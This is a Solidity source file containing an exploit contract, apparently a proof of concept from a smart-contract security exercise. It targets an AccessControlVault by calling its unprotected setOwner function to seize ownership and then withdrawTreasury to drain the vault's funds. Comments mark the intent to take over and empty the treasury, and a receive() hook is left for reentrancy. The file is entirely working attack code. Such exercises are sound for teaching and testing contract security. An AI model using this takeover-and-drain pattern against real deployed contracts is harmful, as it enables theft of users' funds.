// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {AccessControlVault} from "../src/AccessControlVault.sol";

contract ExploitModule {
    AccessControlVault public targetContract;

    constructor(address _target) payable {
        targetContract = AccessControlVault(payable(_target));
    }

    function runExploit() external payable {
        // First, we call setOwner to make ourselves the owner of the vault
        targetContract.setOwner(address(this));

        // Then we call withdrawTreasury to drain the funds
        targetContract.withdrawTreasury(payable(address(this)));
    }

    receive() external payable {
        // Reentrancy / callback handling if applicable
    }
}